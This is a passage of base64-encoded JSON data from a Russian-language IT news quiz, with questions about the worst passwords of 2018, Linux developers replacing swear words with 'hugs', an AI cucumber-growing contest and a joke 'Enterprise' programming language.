iIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiI4MCIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODkwIiwicXVlc3Rpb25faWQiOiI1MzQiLCJ0ZXh0IjoiMTIzNDU2IiwiZGVzY3IiOiI8cD5cdTA0MjdcdTA0NDJcdTA0M2UgXHUwNDMyXHUwNDRiISBcdTA0MmRcdTA0NDJcdTA0M2VcdTA0NDIgXHUwNDNmXHUwNDMwXHUwNDQwXHUwNDNlXHUwNDNiXHUwNDRjIFx1MDQzOFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQ0M1x1MDQ0ZVx1MDQ0MiBcdTA0NDdcdTA0MzBcdTA0NDlcdTA0MzUgXHUwNDMyXHUwNDQxXHUwNDM1XHUwNDQ1IFx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQ0NSBcdTA0MzJcdTA0M2VcdTA0NDIgXHUwNDQzXHUwNDM2XHUwNDM1IDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvdG9wLTEwMC13b3JzdC1wYXNzd29yZHMtMjAxOFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQ0Zlx1MDQ0Mlx1MDQ0Ylx1MDQzOSBcdTA0MzNcdTA0M2VcdTA0MzQgXHUwNDNmXHUwNDNlXHUwNDM0XHUwNDQwXHUwNDRmXHUwNDM0PFwvYT4uIFx1MDQxMCBcdTA0MzhcdTA0MzcgXHUwNDNmXHUwNDM1XHUwNDQwXHUwNDM1XHUwNDQ3XHUwNDM4XHUwNDQxXHUwNDNiXHUwNDM1XHUwNDNkXHUwNDNkXHUwNDRiXHUwNDQ1IFx1MDQ0MFx1MDQzNVx1MDQzNlx1MDQzNSBcdTA0MzJcdTA0NDFcdTA0MzVcdTA0MzNcdTA0M2UgXHUwNDM4XHUwNDQxXHUwNDNmXHUwNDNlXHUwNDNiXHUwNDRjXHUwNDM3XHUwNDQzXHUwNDRlXHUwNDQyIFx1MDBhYmlsb3ZleW91XHUwMGJiLiA8XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6Ijk2IiwiZm9yX3Jlc3VsdCI6Ii0xIn0seyJpZCI6IjE4OTEiLCJxdWVzdGlvbl9pZCI6IjUzNCIsInRleHQiOiJpbG92ZXlvdSIsImRlc2NyIjoiPHA+XHUwNDE0XHUwNDMwISBcdTA0MmRcdTA0NDJcdTA0M2VcdTA0NDIgXHUwNDNmXHUwNDMwXHUwNDQwXHUwNDNlXHUwNDNiXHUwNDRjIFx1MDQzOFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQ0M1x1MDQ0ZVx1MDQ0MiBcdTA0NDBcdTA0MzVcdTA0MzZcdTA0MzUgXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDMwXHUwNDNiXHUwNDRjXHUwNDNkXHUwNDRiXHUwNDQ1LiBcdTA0MWVcdTA0M2QgXHUwNDM3XHUwNDMwXHUwNDNjXHUwNDRiXHUwNDNhXHUwNDMwXHUwNDM1XHUwNDQyIFx1MDQzZlx1MDQzNVx1MDQ0MFx1MDQzMlx1MDQ0M1x1MDQ0ZSBcdTA0MzRcdTA0MzVcdTA0NDFcdTA0NGZcdTA0NDJcdTA0M2FcdTA0NDMgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC90b3AtMTAwLXdvcnN0LXBhc3N3b3Jkcy0yMDE4XC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDQ1XHUwNDQzXHUwNDM0XHUwNDQ4XHUwNDM4XHUwNDQ1IFx1MDQzZlx1MDQzMFx1MDQ0MFx1MDQzZVx1MDQzYlx1MDQzNVx1MDQzOSAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQzMDxcL2E+LjxcL3A+XG4iLCJjb3JyZWN0IjoiMSIsInZvdGVkIjoiMTE1NCIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxOTA4IiwicXVlc3Rpb25faWQiOiI1MzQiLCJ0ZXh0IjoicGFzc3dvcmQiLCJkZXNjciI6IjxwPlx1MDQxMlx1MDQ0Mlx1MDQzZVx1MDQ0MFx1MDQzZVx1MDQzOSBcdTA0M2ZcdTA0M2UgXHUwNDQ3XHUwNDMwXHUwNDQxXHUwNDQyXHUwNDNlXHUwNDQyXHUwNDM1IFx1MDQzOFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZiBcdTA0M2ZcdTA0MzBcdTA0NDBcdTA0M2VcdTA0M2JcdTA0NGMuIFx1MDQxMCBcdTA0M2ZcdTA0NDBcdTA0MzBcdTA0MzJcdTA0MzhcdTA0M2JcdTA0NGNcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDNlXHUwNDQyXHUwNDMyXHUwNDM1XHUwNDQyIFx1MjAxNCBcdTAwYWJpbG92ZXlvdVx1MDBiYi4gXHUwNDFlXHUwNDNkIFx1MDQzN1x1MDQzMFx1MDQzY1x1MDQ0Ylx1MDQzYVx1MDQzMFx1MDQzNVx1MDQ0MiBcdTA0M2ZcdTA0MzVcdTA0NDBcdTA0MzJcdTA0NDNcdTA0NGUgXHUwNDM0XHUwNDM1XHUwNDQxXHUwNDRmXHUwNDQyXHUwNDNhXHUwNDQzIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvdG9wLTEwMC13b3JzdC1wYXNzd29yZHMtMjAxOFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQ0NVx1MDQ0M1x1MDQzNFx1MDQ0OFx1MDQzOFx1MDQ0NSBcdTA0M2ZcdTA0MzBcdTA0NDBcdTA0M2VcdTA0M2JcdTA0MzVcdTA0MzkgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0MzA8XC9hPi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjE2NCIsImZvcl9yZXN1bHQiOiItMSJ9XX0seyJpZCI6IjUzNSIsInRleHQiOiI8cD48c3BhbiBzdHlsZT1cImZvbnQtd2VpZ2h0OiA0MDA7XCI+XHUwNDFkXHUwNDMwIFx1MDQ0N1x1MDQ0Mlx1MDQzZSBcdTA0NDBcdTA0MzBcdTA0MzdcdTA0NDBcdTA0MzBcdTA0MzFcdTA0M2VcdTA0NDJcdTA0NDdcdTA0MzhcdTA0M2FcdTA0MzggXHUwNDM3XHUwNDMwXHUwNDNjXHUwNDM1XHUwNDNkXHUwNDM4XHUwNDNiXHUwNDM4IFx1MDQzZVx1MDQzMVx1MDQ0MVx1MDQ0Nlx1MDQzNVx1MDQzZFx1MDQzZFx1MDQ0M1x1MDQ0ZSBcdTA0M2JcdTA0MzVcdTA0M2FcdTA0NDFcdTA0MzhcdTA0M2FcdTA0NDMgXHUwNDMyIFx1MDQ0Zlx1MDQzNFx1MDQ0MFx1MDQzNSBMaW51eD88XC9zcGFuPjxcL3A+XG4iLCJxdWl6X2lkIjoiNjQiLCJ2b3RlZCI6IjE0OTMiLCJhbnN3ZXJfdHlwZSI6ImNpcmNsZSIsImFuc3dlcnMiOlt7ImlkIjoiMTg5MyIsInF1ZXN0aW9uX2lkIjoiNTM1IiwidGV4dCI6Ilx1MDQxZFx1MDQzMCBcdTAwYWJ4eHhcdTAwYmIiLCJkZXNjciI6IjxwPlx1MDQxZFx1MDQzNVx1MDQ0Mi4gXHUwNDIwXHUwNDMwXHUwNDM3XHUwNDQwXHUwNDMwXHUwNDMxXHUwNDNlXHUwNDQyXHUwNDQ3XHUwNDM4XHUwNDNhXHUwNDM4IExpbnV4IDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvaHVncy1pbnN0ZWFkLW9mLWFidXNpdmUtd29yZHNcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0MzJcdTA0M2ZcdTA0M2VcdTA0M2JcdTA0M2RcdTA0MzU8XC9hPiBcdTA0M2FcdTA0M2VcdTA0M2RcdTA0M2FcdTA0NDBcdTA0MzVcdTA0NDJcdTA0M2RcdTA0NGJcdTA0MzUgXHUwNDM4IFx1MDQzY1x1MDQzOFx1MDQzYlx1MDQ0Ylx1MDQzNSBcdTA0M2JcdTA0NGVcdTA0MzRcdTA0MzguIFx1MDQxZlx1MDQ0MFx1MDQzMFx1MDQzMlx1MDQzOFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0M2VcdTA0NDJcdTA0MzJcdTA0MzVcdTA0NDIgXHUyMDE0IFx1MDBhYmh1Z3NcdTAwYmIuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIxNDYiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg5NCIsInF1ZXN0aW9uX2lkIjoiNTM1IiwidGV4dCI6Ilx1MDQxZFx1MDQzMCBcdTA0NDFcdTA0M2JcdTA0M2VcdTA0MzJcdTA0M2UgXHUwMGFiaHVnc1x1MDBiYiIsImRlc2NyIjoiPHA+PGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9odWdzLWluc3RlYWQtb2YtYWJ1c2l2ZS13b3Jkc1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDBhYlx1MDQxZVx1MDQzMVx1MDQzZFx1MDQzOFx1MDQzY1x1MDQzMFx1MDQ0OFx1MDQzYVx1MDQzOFx1MDBiYjxcL2E+LCBcdTA0MzRcdTA0MzAhIFx1MDBhYkh1Zywgd2UgYXJlIG1pc2VyYWJsZSBwb29yIGd1eXNcdTIwMjZcdTAwYmI8XC9wPlxuIiwiY29ycmVjdCI6IjEiLCJ2b3RlZCI6Ijk0MyIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODk1IiwicXVlc3Rpb25faWQiOiI1MzUiLCJ0ZXh0IjoiXHUwNDFkXHUwNDMwIFx1MDQ0MVx1MDQzYlx1MDQzZVx1MDQzMlx1MDQzZSBcdTAwYWJXaW5kb3dzXHUwMGJiIiwiZGVzY3IiOiI8cD5cdTA0MWRcdTA0MzVcdTA0NDIuIFx1MDQyMFx1MDQzMFx1MDQzN1x1MDQ0MFx1MDQzMFx1MDQzMVx1MDQzZVx1MDQ0Mlx1MDQ0N1x1MDQzOFx1MDQzYVx1MDQzOCBMaW51eCwgXHUwNDMyXHUwNDNlXHUwNDM3XHUwNDNjXHUwNDNlXHUwNDM2XHUwNDNkXHUwNDNlLCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2h1Z3MtaW5zdGVhZC1vZi1hYnVzaXZlLXdvcmRzXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNkXHUwNDMwXHUwNDNmXHUwNDM4XHUwNDQxXHUwNDMwXHUwNDNiXHUwNDM4IFx1MDQzMVx1MDQ0YjxcL2E+OiBcdTAwYWJIdWdnaW5nIFdpbmRvd3NcdTAwYmIuLi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjE4NyIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxOTA5IiwicXVlc3Rpb25faWQiOiI1MzUiLCJ0ZXh0IjoiXHUwNDFmXHUwNDQwXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDNlIFx1MDQzN1x1MDQzMFx1MDQ0Mlx1MDQ1MVx1MDQ0MFx1MDQzYlx1MDQzOCIsImRlc2NyIjoiPHA+XHUwNDJkXHUwNDQyXHUwNDNlIFx1MDQzZFx1MDQzNSBcdTA0NDFcdTA0M2ZcdTA0M2VcdTA0NDBcdTA0NDJcdTA0MzhcdTA0MzJcdTA0M2RcdTA0M2UuIFx1MDQxZVx1MDQ0MVx1MDQzZVx1MDQzMVx1MDQ0Ylx1MDQzYyBcdTA0M2ZcdTA0MzBcdTA0NDJcdTA0NDdcdTA0MzVcdTA0M2MgXHUwNDMyXHUwNDQxXHUwNDRlIFx1MDQzZVx1MDQzMVx1MDQ0MVx1MDQ0Nlx1MDQzNVx1MDQzZFx1MDQzZFx1MDQ0M1x1MDQ0ZSBcdTA0M2JcdTA0MzVcdTA0M2FcdTA0NDFcdTA0MzhcdTA0M2FcdTA0NDMgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9odWdzLWluc3RlYWQtb2YtYWJ1c2l2ZS13b3Jkc1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzN1x1MDQzMFx1MDQzY1x1MDQzNVx1MDQzZFx1MDQzOFx1MDQzYlx1MDQzODxcL2E+IFx1MDQzZFx1MDQzMCBcdTA0NDFcdTA0M2JcdTA0M2VcdTA0MzJcdTA0M2UgXHUwMGFiaHVnc1x1MDBiYi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjIxNiIsImZvcl9yZXN1bHQiOiItMSJ9XX0seyJpZCI6IjUzNiIsInRleHQiOiI8cD5cdTA0MThcdTA0MTggXHUwNDNhXHUwNDMwXHUwNDNhXHUwNDNlXHUwNDM5IElULVx1MDQzYVx1MDQzZVx1MDQzY1x1MDQzZlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQzOCBcdTA0M2JcdTA0NDNcdTA0NDdcdTA0NDhcdTA0MzUgXHUwNDMyXHUwNDQxXHUwNDM1XHUwNDQ1IFx1MDQzMlx1MDQ0Ylx1MDQ0MFx1MDQzMFx1MDQ0OVx1MDQzOFx1MDQzMlx1MDQzMFx1MDQzNVx1MDQ0MiBcdTA0M2VcdTA0MzNcdTA0NDNcdTA0NDBcdTA0NDZcdTA0NGI/PFwvcD5cbiIsInF1aXpfaWQiOiI2NCIsInZvdGVkIjoiMTQ5MyIsImFuc3dlcl90eXBlIjoiY2lyY2xlIiwiYW5zd2VycyI6W3siaWQiOiIxODk2IiwicXVlc3Rpb25faWQiOiI1MzYiLCJ0ZXh0IjoiVGVuY2VudCAiLCJkZXNjciI6IjxwPlx1MDQxYVx1MDQzZVx1MDQzY1x1MDQzMFx1MDQzZFx1MDQzNFx1MDQzNSBcdTA0MzhcdTA0MzcgVGVuY2VudCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2N1Y3VtYmVycy1jb250ZXN0LXJlc3VsdHNcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0MzRcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzBcdTA0M2JcdTA0M2VcdTA0NDFcdTA0NGM8XC9hPiBcdTA0MzJcdTA0NDJcdTA0M2VcdTA0NDBcdTA0M2VcdTA0MzUgXHUwNDNjXHUwNDM1XHUwNDQxXHUwNDQyXHUwNDNlIFx1MDQzMiBcdTA0NDFcdTA0M2VcdTA0NDBcdTA0MzVcdTA0MzJcdTA0M2RcdTA0M2VcdTA0MzJcdTA0MzBcdTA0M2RcdTA0MzhcdTA0MzggXHUwNDQxXHUwNDQwXHUwNDM1XHUwNDM0XHUwNDM4IFx1MDQxOFx1MDQxOCBcdTA0M2ZcdTA0M2UgXHUwNDMyXHUwNDRiXHUwNDQwXHUwNDMwXHUwNDQ5XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRlIFx1MDQzZVx1MDQzM1x1MDQ0M1x1MDQ0MFx1MDQ0Nlx1MDQzZVx1MDQzMi4gXHUwNDE3XHUwNDMwXHUwNDQyXHUwNDNlIFx1MDQzOFx1MDQ0NSBcdTA0MzBcdTA0M2JcdTA0MzNcdTA0M2VcdTA0NDBcdTA0MzhcdTA0NDJcdTA0M2MgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDM0XHUwNDM1XHUwNDNjXHUwNDNlXHUwNDNkXHUwNDQxXHUwNDQyXHUwNDQwXHUwNDM4XHUwNDQwXHUwNDNlXHUwNDMyXHUwNDMwXHUwNDNiIFx1MDQzYlx1MDQ0M1x1MDQ0N1x1MDQ0OFx1MDQ0M1x1MDQ0ZSBcdTA0NDFcdTA0NDJcdTA0NDBcdTA0MzBcdTA0NDJcdTA0MzVcdTA0MzNcdTA0MzhcdTA0NGUgXHUwNDNmXHUwNDNlIFx1MDQzOFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZSBcdTA0NDBcdTA0MzVcdTA0NDFcdTA0NDNcdTA0NDBcdTA0NDFcdTA0M2VcdTA0MzIuIFx1MDQxMCBcdTA0M2ZcdTA0M2VcdTA0MzFcdTA0MzVcdTA0MzRcdTA0MzhcdTA0M2IgXHUwNDE4XHUwNDE4IFx1MDQzZVx1MDQ0MiBNaWNyb3NvZnQuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIzODEiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg5NyIsInF1ZXN0aW9uX2lkIjoiNTM2IiwidGV4dCI6IkludGVsIiwiZGVzY3IiOiI8cD5cdTA0MWRcdTA0MzVcdTA0NDIsIFx1MDQxOFx1MDQxOCBcdTA0M2VcdTA0NDIgSW50ZWwgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9jdWN1bWJlcnMtY29udGVzdC1yZXN1bHRzXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDQ1XHUwNDQzXHUwNDM2XHUwNDM1IFx1MDQzMlx1MDQ0MVx1MDQzNVx1MDQ0NTxcL2E+IFx1MDQzZlx1MDQzZVx1MDQzYVx1MDQzMFx1MDQzN1x1MDQzMFx1MDQzYiBcdTA0NDFcdTA0MzVcdTA0MzFcdTA0NGYgXHUwNDNkXHUwNDMwIFx1MDQ0MVx1MDQzZVx1MDQ0MFx1MDQzNVx1MDQzMlx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0Zlx1MDQ0NSBcdTA0M2ZcdTA0M2UgXHUwNDM4XHUwNDQ1IFx1MDQzMlx1MDQ0Ylx1MDQ0MFx1MDQzMFx1MDQ0OVx1MDQzOFx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZS4gXHUwNDEwIFx1MDQzZlx1MDQzZVx1MDQzMVx1MDQzNVx1MDQzNFx1MDQzOFx1MDQzYiBcdTA0MThcdTA0MTggXHUwNDNlXHUwNDQyIE1pY3Jvc29mdC48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjM2NiIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODk4IiwicXVlc3Rpb25faWQiOiI1MzYiLCJ0ZXh0IjoiTWljcm9zb2Z0ICIsImRlc2NyIjoiPHA+XHUwNDE0XHUwNDMwLCBcdTA0NDEgXHUwNDNlXHUwNDMzXHUwNDQzXHUwNDQwXHUwNDQ2XHUwNDMwXHUwNDNjXHUwNDM4IFx1MDQ0MyBcdTA0MThcdTA0MTggXHUwNDNlXHUwNDQyIE1pY3Jvc29mdCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2N1Y3VtYmVycy1jb250ZXN0LXJlc3VsdHNcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0M2ZcdTA0M2VcdTA0M2JcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDNmXHUwNDNlXHUwNDQwXHUwNDRmXHUwNDM0XHUwNDNlXHUwNDNhPFwvYT46IFx1MDQzMVx1MDQzZVx1MDQzYlx1MDQzNVx1MDQzNSA1MCBcdTA0M2FcdTA0MzhcdTA0M2JcdTA0M2VcdTA0MzNcdTA0NDBcdTA0MzBcdTA0M2NcdTA0M2NcdTA0M2VcdTA0MzIgXHUwNDNkXHUwNDMwIFx1MDQzYVx1MDQzMlx1MDQzMFx1MDQzNFx1MDQ0MFx1MDQzMFx1MDQ0Mlx1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0M2NcdTA0MzVcdTA0NDJcdTA0NDAuIFx1MDQxYlx1MDQ0M1x1MDQ0N1x1MDQ0OFx1MDQzOFx1MDQzOSBcdTA0NDBcdTA0MzVcdTA0MzdcdTA0NDNcdTA0M2JcdTA0NGNcdTA0NDJcdTA0MzBcdTA0NDIgXHUwNDNkXHUwNDMwIFx1MDQ0MVx1MDQzZVx1MDQ0MFx1MDQzNVx1MDQzMlx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0Zlx1MDQ0NSBcdTA0MThcdTA0MTggXHUwNDNmXHUwNDNlIFx1MDQzMlx1MDQ0Ylx1MDQ0MFx1MDQzMFx1MDQ0OVx1MDQzOFx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZSBcdTA0M2VcdTA0MzNcdTA0NDNcdTA0NDBcdTA0NDZcdTA0M2VcdTA0MzIhPFwvcD5cbiIsImNvcnJlY3QiOiIxIiwidm90ZWQiOiI1NDAiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkxMCIsInF1ZXN0aW9uX2lkIjoiNTM2IiwidGV4dCI6IkRlbHBoeSIsImRlc2NyIjoiPHA+XHUwNDFhXHUwNDNlXHUwNDNjXHUwNDMwXHUwNDNkXHUwNDM0XHUwNDM1IERlbHBoeSA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2N1Y3VtYmVycy1jb250ZXN0LXJlc3VsdHNcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj5cdTA0MzRcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzBcdTA0M2JcdTA0M2VcdTA0NDFcdTA0NGM8XC9hPiBcdTA0NDJcdTA0NDBcdTA0MzVcdTA0NDJcdTA0NGNcdTA0MzUgXHUwNDNjXHUwNDM1XHUwNDQxXHUwNDQyXHUwNDNlIFx1MDQzMiBcdTA0NDFcdTA0M2VcdTA0NDBcdTA0MzVcdTA0MzJcdTA0M2RcdTA0M2VcdTA0MzJcdTA0MzBcdTA0M2RcdTA0MzhcdTA0MzggXHUwNDQxXHUwNDQwXHUwNDM1XHUwNDM0XHUwNDM4IFx1MDQxOFx1MDQxOCBcdTA0M2ZcdTA0M2UgXHUwNDMyXHUwNDRiXHUwNDQwXHUwNDMwXHUwNDQ5XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRlIFx1MDQzZVx1MDQzM1x1MDQ0M1x1MDQ0MFx1MDQ0Nlx1MDQzZVx1MDQzMi4gXHUwNDEwIFx1MDQzZlx1MDQzZVx1MDQzMVx1MDQzNVx1MDQzNFx1MDQzOFx1MDQzYiBcdTA0MThcdTA0MTggXHUwNDNlXHUwNDQyIE1pY3Jvc29mdC48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjIwNSIsImZvcl9yZXN1bHQiOiItMSJ9XX0seyJpZCI6IjUzNyIsInRleHQiOiI8cD5cdTA0MWRcdTA0MzAgXHUwNDNhXHUwNDMwXHUwNDNhXHUwNDNlXHUwNDNjIFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYVx1MDQzNSBcdTA0M2RcdTA0MzBcdTA0M2ZcdTA0MzhcdTA0NDFcdTA0MzBcdTA0M2RcdTA0MzAgXHUwNDRkXHUwNDQyXHUwNDMwIFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzM1x1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzY1x1MDQzMD88XC9wPlxuPHByZT48Y29kZT5maW5hbCB1bm5lY2Vzc2FyeSBjbGFzcyBmdWNOdXRGcmVlVXNlck1hbmFnZXIge1xyXG4gIGZpbmFsIHVubmVjZXNzYXJ5IHZvaWQgY29uc3RydWN0b3IoU3RyaW5nIG5hbWUsIE1vbmV5IG51dHNFYXRuLCBNb25leSBtYXhOdXRzKSB7XHJcbiAgICB0aGlzLm5hbWUgPSBuYW1lOzs7XHJcbiAgICB0aGlzLm51dHNFYXRuID0gbnV0c0VhdG47OztcclxuICAgIHRoaXMubWF4TnV0cyA9IG1heE51dHM7OztcclxuICB9XHJcblxyXG4gIGZpbmFsIHVubmVjZXNzYXJ5IE1vbmV5IG51dHNUaWxsRGVhdGgoKSB7XHJcbiAgICByZXR1cm4gdGhpcy5tYXhOdXRzIC0gdGhpcy5udXRzRWF0bjs7O1xyXG4gIH1cclxufTxcL2NvZGU+PFwvcHJlPlxuPHA+Jm5ic3A7PFwvcD5cbiIsInF1aXpfaWQiOiI2NCIsInZvdGVkIjoiMTQ5MyIsImFuc3dlcl90eXBlIjoiY2lyY2xlIiwiYW5zd2VycyI6W3siaWQiOiIxODk5IiwicXVlc3Rpb25faWQiOiI1MzciLCJ0ZXh0IjoiXHUwNDFkXHUwNDM1XHUwNDQzXHUwNDM2XHUwNDM1XHUwNDNiXHUwNDM4IFx1MDQ0Mlx1MDQ0MFx1MDQzNVx1MDQ0Mlx1MDQzOFx1MDQzOSBUeXBlU2NyaXB0PyIsImRlc2NyIjoiPHA+XHUwNDI1XHUwNDNlXHUwNDQyXHUwNDRjIFR5cGVTY3JpcHQgMy4wIFx1MDQzOCBcdTA0MzJcdTA0NGJcdTA0NDhcdTA0MzVcdTA0M2IgXHUwNDMyIDIwMTggXHUwNDMzXHUwNDNlXHUwNDM0XHUwNDQzLCBcdTA0M2RcdTA0M2UgXHUwNDRkXHUwNDQyXHUwNDNlIFx1MDQzYVx1MDQzZVx1MDQzNCBcdTA0M2RcdTA0MzAgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9wcm9ncmFtbWluZy1sYW5ndWFnZS1lbnRlcnByaXNlLXRtXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+RW50ZXJwcmlzZVx1MjEyMjxcL2E+LiBcdTA0MmRcdTA0NDJcdTA0M2UgXHUwNDQ4XHUwNDQzXHUwNDQyXHUwNDNlXHUwNDQ3XHUwNDNkXHUwNDRiXHUwNDM5IFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYSwgXHUwNDMyXHUwNDRiXHUwNDQxXHUwNDNjXHUwNDM1XHUwNDM4XHUwNDMyXHUwNDMwXHUwNDRlXHUwNDQ5XHUwNDM4XHUwNDM5IFx1MDQzZFx1MDQzNVx1MDQzYVx1MDQzZVx1MDQ0Mlx1MDQzZVx1MDQ0MFx1MDQ0Ylx1MDQzNSBcdTA0M2VcdTA0NDFcdTA0M2VcdTA0MzFcdTA0MzVcdTA0M2RcdTA0M2RcdTA0M2VcdTA0NDFcdTA0NDJcdTA0MzggRW50ZXJwcmlzZS1cdTA0NDBcdTA0MzBcdTA0MzdcdTA0NDBcdTA0MzBcdTA0MzFcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzggXHUwNDM4IFx1MDQzZVx1MDQ0Mlx1MDQzZFx1MDQzZVx1MDQ0OFx1MDQzNVx1MDQzZFx1MDQzOFx1MDQzNSBcdTA0M2EgXHUwNDNkXHUwNDM1XHUwNDM5IEhSLVx1MDQzY1x1MDQzNVx1MDQzZFx1MDQzNVx1MDQzNFx1MDQzNlx1MDQzNVx1MDQ0MFx1MDQzZVx1MDQzMi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjMzNSIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxOTAwIiwicXVlc3Rpb25faWQiOiI1MzciLCJ0ZXh0IjoiXHUwNDFjXHUwNDNlXHUwNDM2XHUwNDM1XHUwNDQyIFx1MDQzMVx1MDQ0Ylx1MDQ0Mlx1MDQ0YywgRW50ZXJwcmlzZVx1MjEyMj8iLCJkZXNjciI6IjxwPlx1MDQxNFx1MDQzMCEgXHUwNDJkXHUwNDQyXHUwNDNlIFx1MDQzYVx1MDQzZVx1MDQzNCBcdTA0M2RcdTA0MzAgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9wcm9ncmFtbWluZy1sYW5ndWFnZS1lbnRlcnByaXNlLXRtXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3